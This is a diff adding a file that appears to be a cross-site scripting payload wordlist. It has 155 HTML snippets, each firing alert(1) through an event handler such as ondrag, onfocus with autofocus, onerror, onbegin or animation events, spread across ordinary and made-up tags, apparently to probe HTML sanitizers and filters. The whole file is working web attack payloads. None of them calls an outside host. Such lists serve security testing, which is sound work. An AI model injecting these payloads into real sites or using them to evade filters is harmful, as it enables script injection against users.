@@ -1,0 +1,155 @@
+<a autofocus onfocus=alert(1) href></a>
+<a2 draggable="true" ondrag="alert(1)">test</a2>
+<abbr draggable="true" ondrag="alert(1)">test</abbr>
+<acronym draggable="true" ondrag="alert(1)">test</acronym>
+<address draggable="true" ondrag="alert(1)">test</address>
+<animate draggable="true" ondrag="alert(1)">test</animate>
+<animatemotion draggable="true" ondrag="alert(1)">test</animatemotion>
+<animatetransform draggable="true" ondrag="alert(1)">test</animatetransform>
+<applet draggable="true" ondrag="alert(1)">test</applet>
+<article draggable="true" ondrag="alert(1)">test</article>
+<aside draggable="true" ondrag="alert(1)">test</aside>
+<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio2 draggable="true" ondrag="alert(1)">test</audio2>
+<b draggable="true" ondrag="alert(1)">test</b>
+<bdi draggable="true" ondrag="alert(1)">test</bdi>
+<bdo draggable="true" ondrag="alert(1)">test</bdo>
+<bgsound draggable="true" ondrag="alert(1)">test</bgsound>
+<big draggable="true" ondrag="alert(1)">test</big>
+<blink draggable="true" ondrag="alert(1)">test</blink>
+<blockquote draggable="true" ondrag="alert(1)">test</blockquote>
+<body draggable="true" ondrag="alert(1)">test</body>
+<button autofocus onfocus=alert(1)>test</button>
+<canvas draggable="true" ondrag="alert(1)">test</canvas>
+<caption draggable="true" ondrag="alert(1)">test</caption>
+<center draggable="true" ondrag="alert(1)">test</center>
+<cite draggable="true" ondrag="alert(1)">test</cite>
+<code draggable="true" ondrag="alert(1)">test</code>
+<colgroup draggable="true" ondrag="alert(1)">test</colgroup>
+<content draggable="true" ondrag="alert(1)">test</content>
+<custom tags draggable="true" ondrag="alert(1)">test</custom tags>
+<data draggable="true" ondrag="alert(1)">test</data>
+<datalist draggable="true" ondrag="alert(1)">test</datalist>
+<dd draggable="true" ondrag="alert(1)">test</dd>
+<del draggable="true" ondrag="alert(1)">test</del>
+<details draggable="true" ondrag="alert(1)">test</details>
+<dfn draggable="true" ondrag="alert(1)">test</dfn>
+<dialog draggable="true" ondrag="alert(1)">test</dialog>
+<dir draggable="true" ondrag="alert(1)">test</dir>
+<discard draggable="true" ondrag="alert(1)">test</discard>
+<div draggable="true" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>
+<dl draggable="true" ondrag="alert(1)">test</dl>
+<dt draggable="true" ondrag="alert(1)">test</dt>
+<element draggable="true" ondrag="alert(1)">test</element>
+<em draggable="true" ondrag="alert(1)">test</em>
+<fieldset draggable="true" ondrag="alert(1)">test</fieldset>
+<figcaption draggable="true" ondrag="alert(1)">test</figcaption>
+<figure draggable="true" ondrag="alert(1)">test</figure>
+<font draggable="true" ondrag="alert(1)">test</font>
+<footer draggable="true" ondrag="alert(1)">test</footer>
+<form draggable="true" ondrag="alert(1)">test</form>
+<form><input oninvalid=alert(1) required><input type=submit>
+<form><textarea oninvalid=alert(1) required><input type=submit>
+<frameset draggable="true" ondrag="alert(1)">test</frameset>
+<frameset><frame id=x onfocus=alert(1)>
+<h1 draggable="true" ondrag="alert(1)">test</h1>
+<head draggable="true" ondrag="alert(1)">test</head>
+<header draggable="true" ondrag="alert(1)">test</header>
+<hgroup draggable="true" ondrag="alert(1)">test</hgroup>
+<html draggable="true" ondrag="alert(1)">test</html>
+<i draggable="true" ondrag="alert(1)">test</i>
+<iframe autofocus onfocus=alert(1)>
+<iframe2 draggable="true" ondrag="alert(1)">test</iframe2>
+<image draggable="true" ondrag="alert(1)">test</image>
+<image2 draggable="true" ondrag="alert(1)">test</image2>
+<image3 draggable="true" ondrag="alert(1)">test</image3>
+<img2 draggable="true" ondrag="alert(1)">test</img2>
+<input autofocus onfocus=alert(1)>
+<input2 draggable="true" ondrag="alert(1)">test</input2>
+<input3 draggable="true" ondrag="alert(1)">test</input3>
+<input4 draggable="true" ondrag="alert(1)">test</input4>
+<ins draggable="true" ondrag="alert(1)">test</ins>
+<kbd draggable="true" ondrag="alert(1)">test</kbd>
+<keygen autofocus onfocus=alert(1)>
+<label draggable="true" ondrag="alert(1)">test</label>
+<legend draggable="true" ondrag="alert(1)">test</legend>
+<li draggable="true" ondrag="alert(1)">test</li>
+<listing draggable="true" ondrag="alert(1)">test</listing>
+<main draggable="true" ondrag="alert(1)">test</main>
+<map draggable="true" ondrag="alert(1)">test</map>
+<mark draggable="true" ondrag="alert(1)">test</mark>
+<marquee draggable="true" ondrag="alert(1)">test</marquee>
+<menu draggable="true" ondrag="alert(1)">test</menu>
+<menuitem draggable="true" ondrag="alert(1)">test</menuitem>
+<meter draggable="true" ondrag="alert(1)">test</meter>
+<multicol draggable="true" ondrag="alert(1)">test</multicol>
+<nav draggable="true" ondrag="alert(1)">test</nav>
+<nextid draggable="true" ondrag="alert(1)">test</nextid>
+<nobr draggable="true" ondrag="alert(1)">test</nobr>
+<noembed draggable="true" ondrag="alert(1)">test</noembed>
+<noframes draggable="true" ondrag="alert(1)">test</noframes>
+<noscript draggable="true" ondrag="alert(1)">test</noscript>
+<object data=/ onload=alert(1)>
+<ol draggable="true" ondrag="alert(1)">test</ol>
+<optgroup draggable="true" ondrag="alert(1)">test</optgroup>
+<option draggable="true" ondrag="alert(1)">test</option>
+<output draggable="true" ondrag="alert(1)">test</output>
+<p draggable="true" ondrag="alert(1)">test</p>
+<picture draggable="true" ondrag="alert(1)">test</picture>
+<picture><source srcset="validimage.png"><image onload=alert(1)></picture>
+<plaintext draggable="true" ondrag="alert(1)">test</plaintext>
+<pre draggable="true" ondrag="alert(1)">test</pre>
+<progress draggable="true" ondrag="alert(1)">test</progress>
+<q draggable="true" ondrag="alert(1)">test</q>
+<rb draggable="true" ondrag="alert(1)">test</rb>
+<rp draggable="true" ondrag="alert(1)">test</rp>
+<rt draggable="true" ondrag="alert(1)">test</rt>
+<rtc draggable="true" ondrag="alert(1)">test</rtc>
+<ruby draggable="true" ondrag="alert(1)">test</ruby>
+<s draggable="true" ondrag="alert(1)">test</s>
+<samp draggable="true" ondrag="alert(1)">test</samp>
+<script draggable="true" ondrag="alert(1)">test</script>
+<section draggable="true" ondrag="alert(1)">test</section>
+<select autofocus onfocus=alert(1)>
+<set draggable="true" ondrag="alert(1)">test</set>
+<shadow draggable="true" ondrag="alert(1)">test</shadow>
+<slot draggable="true" ondrag="alert(1)">test</slot>
+<small draggable="true" ondrag="alert(1)">test</small>
+<spacer draggable="true" ondrag="alert(1)">test</spacer>
+<span draggable="true" ondrag="alert(1)">test</span>
+<strike draggable="true" ondrag="alert(1)">test</strike>
+<strong draggable="true" ondrag="alert(1)">test</strong>
+<style draggable="true" ondrag="alert(1)">test</style>
+<style>:target {color: red;}</style><a id=x style="transition:color 10s" ontransitioncancel=alert(1)></a>
+<style>@keyframes slidein {}</style><a style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></a>
+<sub draggable="true" ondrag="alert(1)">test</sub>
+<summary draggable="true" ondrag="alert(1)">test</summary>
+<sup draggable="true" ondrag="alert(1)">test</sup>
+<svg draggable="true" ondrag="alert(1)">test</svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+<svg><discard onbegin=alert(1)>
+<svg><image href=1 onerror=alert(1)>
+<svg><path><animateMotion onbegin=alert(1) dur="1s" repeatCount="1">
+<svg><set onbegin=alert(1) attributename=x dur=1s>
+<table draggable="true" ondrag="alert(1)">test</table>
+<tbody draggable="true" ondrag="alert(1)">test</tbody>
+<td draggable="true" ondrag="alert(1)">test</td>
+<template draggable="true" ondrag="alert(1)">test</template>
+<textarea autofocus onfocus=alert(1)>test</textarea>
+<tfoot draggable="true" ondrag="alert(1)">test</tfoot>
+<th draggable="true" ondrag="alert(1)">test</th>
+<thead draggable="true" ondrag="alert(1)">test</thead>
+<time draggable="true" ondrag="alert(1)">test</time>
+<title draggable="true" ondrag="alert(1)">test</title>
+<tr draggable="true" ondrag="alert(1)">test</tr>
+<tt draggable="true" ondrag="alert(1)">test</tt>
+<u draggable="true" ondrag="alert(1)">test</u>
+<ul draggable="true" ondrag="alert(1)">test</ul>
+<var draggable="true" ondrag="alert(1)">test</var>
+<video autoplay controls onpause=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video2 draggable="true" ondrag="alert(1)">test</video2>
+<video><source onerror=alert(1) src=1></video>
+<video><track default onload=alert(1) src="data:text/vtt,WEBVTT"></video>
+<xmp draggable="true" ondrag="alert(1)">test</xmp>
+<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>
